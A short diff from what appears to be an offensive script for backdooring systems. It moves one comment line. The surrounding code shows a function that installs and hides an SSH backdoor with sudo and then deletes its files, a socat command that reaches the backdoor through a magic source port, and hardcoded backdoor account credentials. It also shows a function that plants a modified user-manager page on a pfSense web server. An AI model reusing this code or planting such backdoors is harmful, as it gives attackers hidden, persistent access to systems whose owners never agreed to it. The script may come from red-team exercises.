@@ -23,10 +23,9 @@ def backdoor_ssh(connect):
     connect.sudo("sh -c './bd_sshd.sh && ./bd_hide.sh && rm bd_*'")
 # Use:
 # socat STDIO TCP4:10.15.2.3:22,sourceport=19526
-# badmin VerySecure
 # totally_legit_user VerySecure
 
-
+# badmin VerySecure
 def backdoor_pfsense_user(connect):
     connect.put('UploadFiles/system_usermanager.php', remote="/usr/local/www/")
 
